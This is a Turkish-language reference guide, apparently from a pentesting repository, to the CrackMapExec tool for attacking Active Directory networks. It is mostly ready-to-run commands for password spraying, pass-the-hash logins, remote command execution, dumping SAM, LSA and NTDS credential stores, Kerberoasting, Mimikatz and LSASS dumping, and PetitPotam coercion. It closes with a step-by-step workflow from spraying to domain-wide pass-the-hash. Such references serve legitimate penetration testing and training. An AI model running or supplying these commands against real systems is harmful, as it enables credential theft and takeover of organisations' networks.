# 🗡️ CrackMapExec - Active Directory İsviçre Çakısı Başvuru Kılavuzu

[🇬🇧 English](../../README.md) | [🇮🇹 Italiano](README.it.md)

```
   ██████╗███╗   ███╗███████╗
  ██╔════╝████╗ ████║██╔════╝
  ██║     ██╔████╔██║█████╗  
  ██║     ██║╚██╔╝██║██╔══╝  
  ╚██████╗██║ ╚═╝ ██║███████╗
   ╚═════╝╚═╝     ╚═╝╚══════╝
   CrackMapExec - Sızma Testleri İçin İsviçre Çakısı
```

<p align="center">
  <img src="https://img.shields.io/badge/CrackMapExec-Active_Directory-red?style=for-the-badge" alt="CME">
  <img src="https://img.shields.io/badge/SMB-blue?style=for-the-badge" alt="SMB">
  <img src="https://img.shields.io/badge/WinRM-green?style=for-the-badge" alt="WinRM">
</p>

---

## 📋 İçindekiler

- [CrackMapExec Nedir?](#-crackmapexec-nedir)
- [Kurulum](#-kurulum)
- [SMB Protokolü](#-smb-protokolü)
- [WinRM Protokolü](#-winrm-protokolü)
- [LDAP Protokolü](#-ldap-protokolü)
- [MSSQL Protokolü](#-mssql-protokolü)
- [SSH Protokolü](#-ssh-protokolü)
- [Modüller (Modules)](#-modüller-modules)
- [Parola Püskürtme (Password Spraying)](#-parola-püskürtme-password-spraying)
- [Veritabanı (cmedb)](#-veritabanı-cmedb)
- [Hızlı Başvuru Tablosu](#-hızlı-başvuru-tablosu)
- [Kaynaklar](#-kaynaklar)

---

## 🎯 CrackMapExec Nedir?

**CrackMapExec** (CME), büyük kurumsal Active Directory ağlarında sömürü sonrası (post-exploitation) aşamasını otomatikleştiren, ağ güvenliği değerlendirmeleri için tasarlanmış çok amaçlı bir araçtır.

Desteklediği Protokoller:
- 🖥️ **SMB (Port 445):** Paylaşımlar, oturumlar, uzaktan komut yürütme, hash dökümü
- 🔧 **WinRM (Port 5985/5986):** Uzaktan PowerShell komut çalıştırma
- 📂 **LDAP (Port 389/636):** Etki alanı kullanıcı ve grup sorguları, parola politikası, BloodHound entegrasyonu
- 🗄️ **MSSQL (Port 1433):** Veritabanı sorguları ve `xp_cmdshell` ile komut çalıştırma
- 🐧 **SSH (Port 22):** Linux sunucularda kimlik doğrulama ve komut yürütme
- 💉 **Pass-the-Hash:** NTLM hash'lerini düz metin parola gibi kullanarak oturum açma

---

## 🚀 Kurulum

### Kali Linux

```bash
# apt üzerinden kurulum
sudo apt update
sudo apt install crackmapexec

# Veya pipx ile en güncel sürümü kurma (Önerilen)
sudo apt install pipx
pipx ensurepath
pipx install crackmapexec
```

### Kurulumu Doğrulama

```bash
crackmapexec --help
crackmapexec smb --help
```

---

## 🖥️ SMB Protokolü

### Temel Ağ Keşfi ve Doğrulama

```bash
# Alt ağdaki canlı SMB sunucularını ve etki alanı adlarını keşfet
cme smb 10.10.10.0/24

# Etki alanı kimlik bilgileriyle doğrulama
cme smb 10.10.10.10 -u kullanici -p parola -d domain.local

# Yerel makine kimlik bilgileri ile doğrulama (--local-auth)
cme smb 10.10.10.10 -u administrator -p parola --local-auth
```

### Pass-the-Hash (Hash ile Giriş)

```bash
# Tek hedefte NTLM hash kullanarak oturum testi
cme smb 10.10.10.10 -u kullanici -H NTLMHASH

# Tüm alt ağa tek bir hash püskürtme (Local admin kontrolü)
cme smb 10.10.10.0/24 -u administrator -H NTLMHASH --local-auth
```

### Paylaşım ve Dosya Numaralandırma (Shares)

```bash
# Erişilebilir ağ paylaşımlarını ve okuma/yazma izinlerini listele
cme smb 10.10.10.10 -u kullanici -p parola --shares

# Paylaşımlar içinde dosya arama (Ör. .txt dosyaları)
cme smb 10.10.10.10 -u kullanici -p parola --spider C$ --pattern txt

# Derinlemesine dizin tarama
cme smb 10.10.10.10 -u kullanici -p parola --spider-folder /paylasim --depth 3
```

### Kullanıcı ve Oturum Bilgisi Toplama

```bash
# RPC üzerinden kullanıcıları listele
cme smb 10.10.10.10 -u kullanici -p parola --users

# Grupları listele
cme smb 10.10.10.10 -u kullanici -p parola --groups

# Aktif oturum açmış kullanıcıları bul
cme smb 10.10.10.10 -u kullanici -p parola --loggedon-users

# RID Brute-Force ile kullanıcı SID ve adlarını dök
cme smb 10.10.10.10 -u kullanici -p parola --rid-brute
```

### Uzaktan Komut Çalıştırma (Execution)

```bash
# CMD komutu çalıştırma
cme smb 10.10.10.10 -u admin -p parola -x "whoami"

# PowerShell komutu çalıştırma
cme smb 10.10.10.10 -u admin -p parola -X "Get-Process"

# Farklı çalıştırma yöntemleri belirleme:
cme smb 10.10.10.10 -u admin -p parola -x "whoami" --exec-method smbexec
cme smb 10.10.10.10 -u admin -p parola -x "whoami" --exec-method wmiexec
cme smb 10.10.10.10 -u admin -p parola -x "whoami" --exec-method atexec
```

### Kimlik Bilgisi Dökümü (Credential Dumping)

```bash
# Yerel SAM veritabanı parola hash'lerini dök
cme smb 10.10.10.10 -u admin -p parola --sam

# LSA gizli parolalarını dök
cme smb 10.10.10.10 -u admin -p parola --lsa

# NTDS.dit etki alanı veritabanını dök (Domain Controller üzerinde DA gerektirir)
cme smb DC01.domain.local -u admin -p parola --ntds

# VSS veya DRSUAPI yöntemiyle NTDS dökümü
cme smb DC01 -u admin -p parola --ntds drsuapi
cme smb DC01 -u admin -p parola --ntds vss
```

### SMB İmzalama (SMB Signing) Kontrolü
NTLM Relay saldırısı yapabilmek için SMB imzalaması zorunlu olmayan (`SMB signing: False`) cihazları tespit edin:
```bash
cme smb 10.10.10.0/24 --gen-relay-list relay_hedefleri.txt
```

---

## 🔧 WinRM Protokolü

```bash
# WinRM erişimini denetleme
cme winrm 10.10.10.10 -u kullanici -p parola

# Tüm ağda WinRM açık olan makineleri bulma
cme winrm 10.10.10.0/24 -u kullanici -p parola

# Komut çalıştırma
cme winrm 10.10.10.10 -u admin -p parola -x "whoami"
cme winrm 10.10.10.10 -u admin -p parola -X "Get-Service"

# WinRM üzerinden SAM dökümü
cme winrm 10.10.10.10 -u admin -p parola --sam
```

---

## 📂 LDAP Protokolü

```bash
# Temel LDAP bağlantısı
cme ldap DC01.domain.local -u kullanici -p parola

# AS-REP Roastable kullanıcıları bulup hash'lerini kaydetme
cme ldap DC01 -u kullanici -p parola --asreproast asrep_hashleri.txt

# Kerberoastable hesapları tespit edip biletleri çekme
cme ldap DC01 -u kullanici -p parola --kerberoasting kerb_biletleri.txt

# Etki alanı parola politikasını sorgulama (Hesap kilitleme eşiklerini öğrenin!)
cme ldap DC01 -u kullanici -p parola --password-policy

# Doğrudan LDAP üzerinden BloodHound veri toplaması çalıştırma
cme ldap DC01 -u kullanici -p parola --bloodhound -ns DC01 -c All
```

---

## 🗄️ MSSQL Protokolü

```bash
# MSSQL bağlantısı (SQL kimlik doğrulaması)
cme mssql 10.10.10.10 -u sa -p parola

# Windows / Etki Alanı kimlik doğrulaması ile bağlanma
cme mssql 10.10.10.10 -u kullanici -p parola -d domain.local

# xp_cmdshell özelliğini aktif etme ve komut çalıştırma
cme mssql 10.10.10.10 -u sa -p parola --enable-xp
cme mssql 10.10.10.10 -u sa -p parola -x "whoami"

# SQL sorgusu çalıştırma
cme mssql 10.10.10.10 -u sa -p parola -q "SELECT @@version"
```

---

## 🐧 SSH Protokolü

```bash
# SSH giriş denetimi
cme ssh 10.10.10.10 -u root -p parola

# SSH özel anahtarı (private key) ile giriş
cme ssh 10.10.10.10 -u kullanici --key-file id_rsa

# Komut çalıştırma
cme ssh 10.10.10.10 -u root -p parola -x "id"
```

---

## 🧩 Modüller (Modules)

Kullanılabilir tüm modülleri görmek için: `cme smb -L`

```bash
# LSASS bellek dökümü (lsassy modülü)
cme smb 10.10.10.10 -u admin -p parola -M lsassy

# Mimikatz çalıştırma
cme smb 10.10.10.10 -u admin -p parola -M mimikatz

# Grup İlkesi (GPP) açık parola arama
cme smb DC01 -u kullanici -p parola -M gpp_password

# PetitPotam NTLM tetikleme
cme smb 10.10.10.10 -u kullanici -p parola -M petitpotam
```

---

## 🔓 Parola Püskürtme (Password Spraying)

Etki alanı hesap kilitleme (Account Lockout) eşiğini aşmadan parola denemesi yapma tekniğidir.

```bash
# Tek bir yaygın parolayı tüm kullanıcı listesine deneme
cme smb 10.10.10.10 -u kullanicilar.txt -p 'Yaz2024!' --continue-on-success

# Tüm alt ağ üzerinde parola püskürtme
cme smb 10.10.10.0/24 -u kullanicilar.txt -p 'Sirket2024!' --continue-on-success
```

> **Önemli Kural:** Parola püskürtmeye başlamadan önce MUTLAKA `cme ldap DC01 -u user -p pass --password-policy` ile `Lockout threshold` (kilitleme eşiği) değerini kontrol edin!

---

## 💾 Veritabanı (cmedb)

CrackMapExec ele geçirdiği tüm kullanıcı parolalarını ve taranan makineleri yerel SQLite veritabanında saklar.
```bash
# Veritabanı konsolunu açın
cmedb

# cmedb komutları:
creds           # Ele geçirilen tüm kimlik bilgileri ve hash'ler
hosts           # Başarıyla ulaşılan ana makineler
```

---

## 📊 Hızlı Başvuru Tablosu

### Çıktı İşaretleri

| İşaret | Anlamı |
|--------|--------|
| `[+]` | Başarılı kimlik doğrulama |
| `[-]` | Başarısız kimlik doğrulama / Hata |
| `[*]` | Bilgilendirme mesajı |
| `(Pwn3d!)` | Hedef makinede **Yerel Yönetici (Admin)** yetkisi doğrulandı! |

### Tipik Test İş Akışı

```bash
# 1. Adım: Ağı haritalandır
cme smb 10.10.10.0/24

# 2. Adım: Parola püskürtme ile geçerli bir kullanıcı bul
cme smb 10.10.10.0/24 -u users.txt -p 'Welcome123!' --continue-on-success

# 3. Adım: Bulunan kullanıcı ile yerel yönetici olduğunuz makineleri arayın (Pwn3d! arayın)
cme smb 10.10.10.0/24 -u bulunan_user -p 'Welcome123!'

# 4. Adım: Yönetici olduğunuz makineden SAM ve LSA dökümü alın
cme smb 10.10.10.50 -u bulunan_user -p 'Welcome123!' --sam --lsa

# 5. Adım: Elde edilen yeni hash'lerle etki alanında ilerleyin (Pass-the-Hash)
cme smb 10.10.10.0/24 -u Administrator -H YENIHASH
```

---

## 📚 Kaynaklar

- [CrackMapExec GitHub Deposu](https://github.com/Porchetta-Industries/CrackMapExec)
- [CrackMapExec Resmi Belgeleri](https://wiki.porchetta.industries/)
- [Impacket Kılavuzumuz](../../Impacket/translations/README.tr.md)

---

<p align="center">
  <b>🗡️ Ağı Ele Geçirin!</b><br>
  <i>CrackMapExec - Sızma testi uzmanlarının vazgeçilmez aracı</i>
</p>
